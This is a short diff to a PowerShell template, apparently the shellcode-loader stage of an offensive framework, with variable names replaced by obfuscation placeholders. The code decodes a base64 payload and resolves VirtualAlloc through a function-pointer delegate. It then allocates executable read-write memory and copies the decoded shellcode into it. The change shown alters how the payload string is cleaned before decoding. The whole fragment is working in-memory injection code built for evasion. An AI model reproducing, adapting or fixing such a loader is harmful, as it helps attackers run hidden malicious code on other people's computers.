@@ -65,7 +65,7 @@ function %%VAR6%% {
 $%%VAR10%% = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%%PAYLOAD%%'))
 $%%VAR34%% = %%VAR19%%
 $%%VAR35%% = %%VAR25%% $%%VAR34%% $%%VAR10%%
-[Byte[]]$%%VAR10%% = [System.Convert]::FromBase64String($%%VAR35%%)
+[Byte[]]$%%VAR10%% = [System.Convert]::FromBase64String($%%VAR35%%.Replace('"',''))
 $%%VAR11%% = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((%%VAR2%% kernel32.dll VirtualAlloc), (%%VAR6%% @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
 $%%VAR12%% = $%%VAR11%%.Invoke([IntPtr]::Zero, $%%VAR10%%.Length, 0x3000, 0x40)
 [System.Runtime.InteropServices.Marshal]::Copy($%%VAR10%%, 0, $%%VAR12%%, $%%VAR10%%.length)
